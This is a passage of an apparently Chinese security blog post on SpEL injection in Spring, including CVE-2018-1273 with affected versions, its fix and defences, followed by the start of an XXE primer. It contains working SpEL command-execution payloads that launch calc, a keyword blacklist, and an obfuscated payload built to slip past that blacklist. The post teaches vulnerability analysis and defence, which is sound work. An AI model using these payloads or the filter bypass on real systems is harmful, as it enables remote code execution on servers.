<h5 id="所以会直接返回null-解析失败。"><a href="#所以会直接返回null-解析失败。" class="headerlink" title="所以会直接返回null,解析失败。"></a>所以会直接返回null,解析失败。</h5><h4 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h4><h5 id="若修改了SpringBoot的版本-Spring的版本也要跟着修改匹配-匹配表-https-www-cnblogs-com-badtree-articles-9145493-html"><a href="#若修改了SpringBoot的版本-Spring的版本也要跟着修改匹配-匹配表-https-www-cnblogs-com-badtree-articles-9145493-html" class="headerlink" title="若修改了SpringBoot的版本,Spring的版本也要跟着修改匹配,匹配表:https://www.cnblogs.com/badtree/articles/9145493.html"></a>若修改了SpringBoot的版本,Spring的版本也要跟着修改匹配,匹配表:<a href="https://www.cnblogs.com/badtree/articles/9145493.html" target="_blank" rel="noopener">https://www.cnblogs.com/badtree/articles/9145493.html</a></h5><h5 id="Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons远程代码执行漏洞（CVE-2018-1273）"></a>Spring Data Commons远程代码执行漏洞（CVE-2018-1273）</h5><h5 id="使用了StandardEvaluationContext作为虚拟容器-表达式可控且最后调用了其setValue-方法"><a href="#使用了StandardEvaluationContext作为虚拟容器-表达式可控且最后调用了其setValue-方法" class="headerlink" title="使用了StandardEvaluationContext作为虚拟容器,表达式可控且最后调用了其setValue()方法"></a>使用了StandardEvaluationContext作为虚拟容器,表达式可控且最后调用了其setValue()方法</h5><h5 id="漏洞环境参考-https-github-com-wearearima-poc-cve-2018-1273"><a href="#漏洞环境参考-https-github-com-wearearima-poc-cve-2018-1273" class="headerlink" title="漏洞环境参考:https://github.com/wearearima/poc-cve-2018-1273"></a>漏洞环境参考:<a href="漏洞环境参考:https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a></h5><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><h5 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.13-1.13.10</span><br><span class="line">2.0-2.0.5</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="传入payload"><a href="#传入payload" class="headerlink" title="传入payload:"></a>传入payload:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/account			</span></span><br><span class="line">name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123</span><br><span class="line"></span><br><span class="line">name[T(java.lang.Runtime).getRuntime().exec(<span class="string">'calc'</span>)]=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.22.01.46-image.png" alt></p>
<h5 id="根据分析文章-我们直接定位到org-springframework-data-web-MapDataBinder-setProperty-下个断点-由函数名字可看出该方法作用时是设置成员变量值"><a href="#根据分析文章-我们直接定位到org-springframework-data-web-MapDataBinder-setProperty-下个断点-由函数名字可看出该方法作用时是设置成员变量值" class="headerlink" title="根据分析文章,我们直接定位到org.springframework.data.web.MapDataBinder.setProperty(),下个断点,由函数名字可看出该方法作用时是设置成员变量值"></a>根据分析文章,我们直接定位到<code>org.springframework.data.web.MapDataBinder.setProperty()</code>,下个断点,由函数名字可看出该方法作用时是设置成员变量值</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.49.20-image.png" alt></p>
<h5 id="propertyName是我们传入的payload-接着设置了context与expression-最后调用setValue-触发"><a href="#propertyName是我们传入的payload-接着设置了context与expression-最后调用setValue-触发" class="headerlink" title="propertyName是我们传入的payload,接着设置了context与expression,最后调用setValue()触发"></a>propertyName是我们传入的payload,接着设置了context与expression,最后调用<code>setValue()</code>触发</h5><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.54.03-image.png" alt></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.55.47-image.png" alt></p>
<h5 id="弹出计算器"><a href="#弹出计算器" class="headerlink" title="弹出计算器"></a>弹出计算器</h5><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><h5 id="官方修复代码-https-github-com-spring-projects-spring-data-commons-commit-ae1dd2741ce06d44a0966ecbd6f47beabde2b653"><a href="#官方修复代码-https-github-com-spring-projects-spring-data-commons-commit-ae1dd2741ce06d44a0966ecbd6f47beabde2b653" class="headerlink" title="官方修复代码:https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653"></a>官方修复代码:<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></h5><h5 id="大意为StandardEvaluationContext更换为SimpleEvaluationContext-在基础知识中我们已经讲到后者权限较小-不能执行恶意代码-只支持一些map结构-所以可以防止被攻击。"><a href="#大意为StandardEvaluationContext更换为SimpleEvaluationContext-在基础知识中我们已经讲到后者权限较小-不能执行恶意代码-只支持一些map结构-所以可以防止被攻击。" class="headerlink" title="大意为StandardEvaluationContext更换为SimpleEvaluationContext,在基础知识中我们已经讲到后者权限较小,不能执行恶意代码,只支持一些map结构,所以可以防止被攻击。"></a>大意为<code>StandardEvaluationContext</code>更换为<code>SimpleEvaluationContext</code>,在基础知识中我们已经讲到后者权限较小,不能执行恶意代码,只支持一些map结构,所以可以防止被攻击。</h5><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h5 id="最简单的方法就是使用较为安全的实现类SimpleEvaluationContext去防御"><a href="#最简单的方法就是使用较为安全的实现类SimpleEvaluationContext去防御" class="headerlink" title="最简单的方法就是使用较为安全的实现类SimpleEvaluationContext去防御"></a>最简单的方法就是使用较为安全的实现类SimpleEvaluationContext去防御</h5><h5 id="官方文档可参考-https-docs-spring-io-spring-docs-5-0-6-RELEASE-javadoc-api-org-springframework-expression-spel-support-SimpleEvaluationContext-html"><a href="#官方文档可参考-https-docs-spring-io-spring-docs-5-0-6-RELEASE-javadoc-api-org-springframework-expression-spel-support-SimpleEvaluationContext-html" class="headerlink" title="官方文档可参考:https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html"></a>官方文档可参考:<a href="https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html</a></h5><h5 id="一般使用："><a href="#一般使用：" class="headerlink" title="一般使用："></a>一般使用：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User user=<span class="keyword">new</span> User(<span class="string">"P0rZ9"</span>);</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        Expression exp = parser.parseExpression(<span class="string">"name"</span>);</span><br><span class="line">        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(user).build();</span><br><span class="line">        exp.getValue(context);</span><br></pre></td></tr></table></figure>

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><h5 id="一般使用SpEl表达式的就是利用其内部使用反射这个特点-从而很方便去操作Bean-存取数据等。以后在审计时可以通过留意StandardEvaluationContext与getValue-setValue-这些关键方法。"><a href="#一般使用SpEl表达式的就是利用其内部使用反射这个特点-从而很方便去操作Bean-存取数据等。以后在审计时可以通过留意StandardEvaluationContext与getValue-setValue-这些关键方法。" class="headerlink" title="一般使用SpEl表达式的就是利用其内部使用反射这个特点,从而很方便去操作Bean 存取数据等。以后在审计时可以通过留意StandardEvaluationContext与getValue() setValue()这些关键方法。"></a>一般使用SpEl表达式的就是利用其内部使用反射这个特点,从而很方便去操作Bean 存取数据等。以后在审计时可以通过留意StandardEvaluationContext与getValue() setValue()这些关键方法。</h5><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h5 id="https-www-cnblogs-com-litlife-p-10183137-html-x04-E5-8F-82-E8-80-83-E6-96-87-E7-AB-A0"><a href="#https-www-cnblogs-com-litlife-p-10183137-html-x04-E5-8F-82-E8-80-83-E6-96-87-E7-AB-A0" class="headerlink" title="https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"></a><a href="https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0</a></h5><h5 id="https-www-cnblogs-com-litlife-p-10183137-html-x04-E5-8F-82-E8-80-83-E6-96-87-E7-AB-A0-1"><a href="#https-www-cnblogs-com-litlife-p-10183137-html-x04-E5-8F-82-E8-80-83-E6-96-87-E7-AB-A0-1" class="headerlink" title="https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"></a><a href="https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0</a></h5><h5 id="https-mp-weixin-qq-com-s-biz-MzAwMzI0MTMwOQ-amp-mid-2650173748-amp-idx-1-amp-sn-a0fa9e48ed05d80b7c693082f6b687ce-amp-scene-1-amp-srcid-0911LaFVNrVdYZr7nIyS8Nn3-rd"><a href="#https-mp-weixin-qq-com-s-biz-MzAwMzI0MTMwOQ-amp-mid-2650173748-amp-idx-1-amp-sn-a0fa9e48ed05d80b7c693082f6b687ce-amp-scene-1-amp-srcid-0911LaFVNrVdYZr7nIyS8Nn3-rd" class="headerlink" title="https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;mid=2650173748&amp;idx=1&amp;sn=a0fa9e48ed05d80b7c693082f6b687ce&amp;scene=1&amp;srcid=0911LaFVNrVdYZr7nIyS8Nn3#rd"></a><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&mid=2650173748&idx=1&sn=a0fa9e48ed05d80b7c693082f6b687ce&scene=1&srcid=0911LaFVNrVdYZr7nIyS8Nn3#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;mid=2650173748&amp;idx=1&amp;sn=a0fa9e48ed05d80b7c693082f6b687ce&amp;scene=1&amp;srcid=0911LaFVNrVdYZr7nIyS8Nn3#rd</a></h5><h5 id="https-www-kingkk-com-2019-05-SPEL-E8-A1-A8-E8-BE-BE-E5-BC-8F-E6-B3-A8-E5-85-A5-E5-85-A5-E9-97-A8-E7-AF-87"><a href="#https-www-kingkk-com-2019-05-SPEL-E8-A1-A8-E8-BE-BE-E5-BC-8F-E6-B3-A8-E5-85-A5-E5-85-A5-E9-97-A8-E7-AF-87" class="headerlink" title="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/"></a><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/" target="_blank" rel="noopener">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a></h5><h5 id="https-laworigin-github-io-2019-04-09-Spring-messaging-SPEL-Injection"><a href="#https-laworigin-github-io-2019-04-09-Spring-messaging-SPEL-Injection" class="headerlink" title="https://laworigin.github.io/2019/04/09/Spring-messaging-SPEL-Injection/"></a><a href="https://laworigin.github.io/2019/04/09/Spring-messaging-SPEL-Injection/" target="_blank" rel="noopener">https://laworigin.github.io/2019/04/09/Spring-messaging-SPEL-Injection/</a></h5><h4 id="SpEL表达式测试注入篇："><a href="#SpEL表达式测试注入篇：" class="headerlink" title="SpEL表达式测试注入篇："></a>SpEL表达式测试注入篇：</h4><h5 id="基础测试例子："><a href="#基础测试例子：" class="headerlink" title="基础测试例子："></a>基础测试例子：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/spel"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">spel</span><span class="params">(String input)</span></span>&#123;</span><br><span class="line">    SpelExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    Expression expression = parser.parseExpression(input);</span><br><span class="line">    <span class="keyword">return</span> expression.getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="对于这种我们先简单输入2-2，如果解析返回值是4存在注入。"><a href="#对于这种我们先简单输入2-2，如果解析返回值是4存在注入。" class="headerlink" title="对于这种我们先简单输入2*2，如果解析返回值是4存在注入。"></a>对于这种我们先简单输入<code>2*2</code>，如果解析返回值是<code>4</code>存在注入。</h5><h5 id="简单执行系统命令："><a href="#简单执行系统命令：" class="headerlink" title="简单执行系统命令："></a>简单执行系统命令：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/spel?input=new java.lang.ProcessBuilder(&quot;calc&quot;).start()</span><br><span class="line">/spel?input=$&#123;new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()&#125;</span><br></pre></td></tr></table></figure>

<h5 id="上面已经详细介绍了污染的版本，和解决方案。"><a href="#上面已经详细介绍了污染的版本，和解决方案。" class="headerlink" title="上面已经详细介绍了污染的版本，和解决方案。"></a>上面已经详细介绍了污染的版本，和解决方案。</h5><h5 id="下面给出过滤规则："><a href="#下面给出过滤规则：" class="headerlink" title="下面给出过滤规则："></a>下面给出过滤规则：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keywords:</span><br><span class="line">  blacklist:</span><br><span class="line">    - java.+lang</span><br><span class="line">    - Runtime</span><br><span class="line">    - exec.*\(</span><br></pre></td></tr></table></figure>

<h5 id="payload如下："><a href="#payload如下：" class="headerlink" title="payload如下："></a>payload如下：</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.getClass()).invoke(''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'calc')&#125;</span><br></pre></td></tr></table></figure>

<h5 id="我们可以一步一步来分析下这个payload"><a href="#我们可以一步一步来分析下这个payload" class="headerlink" title="我们可以一步一步来分析下这个payload"></a>我们可以一步一步来分析下这个payload</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.getClass()</span><br><span class="line"><span class="comment">// class java.lang.String</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>)</span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'ex'</span>+<span class="string">'ec'</span>,<span class="string">''</span>.getClass())</span><br><span class="line"><span class="comment">// public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'getRu'</span>+<span class="string">'ntime'</span>)</span><br><span class="line"><span class="comment">// public static java.lang.Runtime java.lang.Runtime.getRuntime()</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'getRu'</span>+<span class="string">'ntime'</span>).invoke(<span class="keyword">null</span>)</span><br><span class="line"><span class="comment">// java.lang.Runtime@c2939a</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'ex'</span>+<span class="string">'ec'</span>,<span class="string">''</span>.getClass()).invoke(<span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'getRu'</span>+<span class="string">'ntime'</span>).invoke(<span class="keyword">null</span>),<span class="string">'calc'</span>)</span><br><span class="line"><span class="comment">// java.lang.ProcessImpl@f2f85c</span></span><br></pre></td></tr></table></figure>

<h4 id="xxe篇："><a href="#xxe篇：" class="headerlink" title="xxe篇："></a>xxe篇：</h4><h5 id="什么是XXE："><a href="#什么是XXE：" class="headerlink" title="什么是XXE："></a>什么是XXE：</h5><h6 id="XXE-XML-External-Entity-Injection-全称为-XML-外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。-看到这里肯定有人要说：你这不是在废话-，固然，其实我这里废话只是想强调我们的利用点是-外部实体-，也是提醒读者将注意力集中于外部实体中，而不要被-XML-中其他的一些名字相似的东西扰乱了思维-盯好外部实体就行了-，如果能注入-外部实体并且成功解析的话，这就会大大拓宽我们-XML-注入的攻击面（这可能就是为什么单独说-而没有说-XML-注入的原因吧，或许普通的-XML-注入真的太鸡肋了，现实中几乎用不到）"><a href="#XXE-XML-External-Entity-Injection-全称为-XML-外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。-看到这里肯定有人要说：你这不是在废话-，固然，其实我这里废话只是想强调我们的利用点是-外部实体-，也是提醒读者将注意力集中于外部实体中，而不要被-XML-中其他的一些名字相似的东西扰乱了思维-盯好外部实体就行了-，如果能注入-外部实体并且成功解析的话，这就会大大拓宽我们-XML-注入的攻击面（这可能就是为什么单独说-而没有说-XML-注入的原因吧，或许普通的-XML-注入真的太鸡肋了，现实中几乎用不到）" class="headerlink" title="XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）"></a>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）</h6><h4 id="背景知识："><a href="#背景知识：" class="headerlink" title="背景知识："></a>背景知识：</h4><h6 id="XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML，-XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。-外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。-但是，在处理外部实体时，可以针对应用程序启动许多攻击。-这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。-通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。"><a href="#XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML，-XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。-外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。-但是，在处理外部实体时，可以针对应用程序启动许多攻击。-这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。-通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。" class="headerlink" title="XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。"></a>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</h6><h4 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h4><h5 id="XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD-document-type-definition-的东西控制的，如下："><a href="#XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD-document-type-definition-的东西控制的，如下：" class="headerlink" title="XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD(document type definition)的东西控制的，如下："></a>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD(document type definition)的东西控制的，如下：</h5><h5 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h6 id="上面这个-DTD-就定义了-XML-的根元素是-message，然后跟元素下面有一些子元素，那么-XML-到时候必须像下面这么写"><a href="#上面这个-DTD-就定义了-XML-的根元素是-message，然后跟元素下面有一些子元素，那么-XML-到时候必须像下面这么写" class="headerlink" title="上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写"></a>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</h6><h5 id="示例代码：-1"><a href="#示例代码：-1" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="其实除了在-DTD-中定义元素（其实就是对应-XML-中的标签）以外，我们还能在-DTD-中定义实体-对应XML-标签中的内容-，毕竟-ML-中除了能标签以外，还需要有些内容是固定的"><a href="#其实除了在-DTD-中定义元素（其实就是对应-XML-中的标签）以外，我们还能在-DTD-中定义实体-对应XML-标签中的内容-，毕竟-ML-中除了能标签以外，还需要有些内容是固定的" class="headerlink" title="其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的"></a>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</h6><h5 id="示例代码：-2"><a href="#示例代码：-2" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure>

